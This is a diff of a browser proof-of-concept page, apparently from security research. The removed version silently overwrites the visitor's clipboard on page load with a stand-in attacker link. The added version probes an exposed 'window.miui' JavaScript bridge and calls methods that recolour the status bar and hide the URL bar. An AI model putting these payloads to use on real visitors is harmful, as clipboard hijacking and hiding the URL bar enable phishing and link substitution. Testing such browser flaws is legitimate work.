@@ -1,26 +1,24 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Clipboard PoC</title>
-</head>
-<body>
-  <h2>Clipboard Write PoC</h2>
-  <p>Kalau browser lo vulnerable, clipboard sekarang bakal ke-replace otomatis.</p>
+<!doctype html><meta charset="utf-8">
+<body style="white-space:pre;font-family:monospace"></body>
+<script>
+(function(){
+  function log(s){ document.body.textContent += s + "\n"; console.log(s); }
+  try {
+    log("domain: " + location.href);
+    if (typeof window.miui === 'object') {
+      log("[+] miui exposed");
+      for (var k in window.miui) log(" - " + k + " : " + typeof window.miui[k]);
+      try { log("getLanguage: " + (window.miui.getLanguage && window.miui.getLanguage())); } catch(e){ log("getLanguage err " + e); }
+      try { log("getRegion: " + (window.miui.getRegion && window.miui.getRegion())); } catch(e){ log("getRegion err " + e); }
 
-  <script>
-    async function overwriteClipboard() {
-      try {
-        await navigator.clipboard.writeText("https://attacker.com/malicious-link");
-        console.log("Clipboard ditimpa tanpa izin 👾");
-        alert("✅ Clipboard lo udah ketimpa tanpa permission!");
-      } catch (err) {
-        console.error("Clipboard gagal:", err);
-      }
+      // UI manip test (non-destructive):
+      try { window.miui.setStatusBarColor("#00FF00", true); log("setStatusBarColor called"); } catch(e){ log("setStatusBarColor err "+e); }
+      try { window.miui.showUrlBar(false); log("showUrlBar(false) called"); } catch(e){ log("showUrlBar err "+e); }
+    } else {
+      log("[-] miui not found");
     }
-
-    // langsung jalan pas halaman dibuka
-    overwriteClipboard();
-  </script>
-</body>
-</html>
+  } catch(err){
+    log("fatal err: "+err);
+  }
+})();
+</script>
